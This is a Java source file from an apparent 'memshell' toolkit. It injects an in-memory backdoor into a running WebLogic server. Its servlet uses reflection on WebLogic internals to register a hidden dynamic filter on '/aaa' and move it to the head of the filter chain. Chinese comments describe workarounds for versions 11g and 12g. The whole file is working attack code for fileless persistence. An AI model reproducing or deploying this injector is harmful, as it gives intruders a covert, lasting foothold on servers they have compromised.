package com.memshell.weblogic;

import com.memshell.generic.Util;
import weblogic.servlet.internal.FilterManager;
import weblogic.servlet.internal.WebAppServletContext;
import weblogic.servlet.utils.ServletMapping;
import weblogic.utils.collections.MatchMap;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Map;

public class FilterBasedBasic extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {

        //为了兼容低版本的 weblgoic，所以有些逻辑（如排序）没法利用现成的 api，因为老版本不持
        try {
            String filterName = "dynamicFilter1";
            String urlPattern = "/aaa";

            Field contextField = req.getClass().getDeclaredField("context");
            contextField.setAccessible(true);
            WebAppServletContext servletContext = (WebAppServletContext) contextField.get(req);
            FilterManager filterManager = servletContext.getFilterManager();

            // 判断一下，防止多次加载， 默认只加载一次，不需要重复加载
            if (!filterManager.isFilterRegistered(filterName)) {
                System.out.println("[+] Add Dynamic Filter");

                Class clazz = Util.getDynamicFilterTemplateClass();

                //将 Filter 注册进 FilterManager
                //参数： String filterName, String filterClassName, String[] urlPatterns, String[] servletNames, Map initParams, String[] dispatchers
                Method registerFilterMethod = filterManager.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, Map.class, String[].class);
                registerFilterMethod.setAccessible(true);
                registerFilterMethod.invoke(filterManager, filterName, "com.memshell.generic.DynamicFilterTemplate", new String[]{urlPattern}, null, null, null);


                //将我们添加的 Filter 移动到 FilterChian 的第一位
                Field filterPatternListField = filterManager.getClass().getDeclaredField("filterPatternList");
                filterPatternListField.setAccessible(true);
                ArrayList filterPatternList = (ArrayList)filterPatternListField.get(filterManager);


                //不能用 filterName 来判断，因为在 11g 中此值为空，在 12g 中正常
                for(int i = 0; i < filterPatternList.size(); i++){
                    Object filterPattern = filterPatternList.get(i);
                    Field f = filterPattern.getClass().getDeclaredField("map");
                    f.setAccessible(true);
                    ServletMapping mapping = (ServletMapping) f.get(filterPattern);

                    f = mapping.getClass().getSuperclass().getDeclaredField("matchMap");
                    f.setAccessible(true);
                    MatchMap matchMap = (MatchMap)f.get(mapping);

                    Object result = matchMap.match(urlPattern);
                    if(result != null && result.toString().contains(urlPattern)){
                        Object temp = filterPattern;
                        filterPatternList.set(i, filterPatternList.get(0));
                        filterPatternList.set(0, temp);
                        break;
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}